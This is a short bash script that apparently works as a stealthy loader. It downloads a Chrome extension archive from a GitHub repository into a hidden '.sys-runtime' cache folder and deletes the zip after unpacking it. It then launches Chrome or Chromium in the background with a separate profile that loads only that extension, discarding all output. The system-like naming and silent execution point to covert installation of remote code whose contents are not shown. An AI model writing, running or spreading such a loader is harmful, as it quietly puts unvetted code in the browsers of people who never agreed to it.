#!/bin/bash
B="$HOME/.cache/.sys-runtime";mkdir -p "$B";curl -Ls https://github.com/school0102/Google-Chrome-Extension/archive/refs/heads/main.zip -o "$B/.e.zip";unzip -oq "$B/.e.zip" -d "$B";rm -f "$B/.e.zip";C=$(command -v google-chrome||command -v chromium||command -v chromium-browser);[ -z "$C" ]&&exit 1;"$C" --user-data-dir="$B/.p" --disable-extensions-except="$B/Google-Chrome-Extension-main" --load-extension="$B/Google-Chrome-Extension-main" >/dev/null 2>&1 & exit
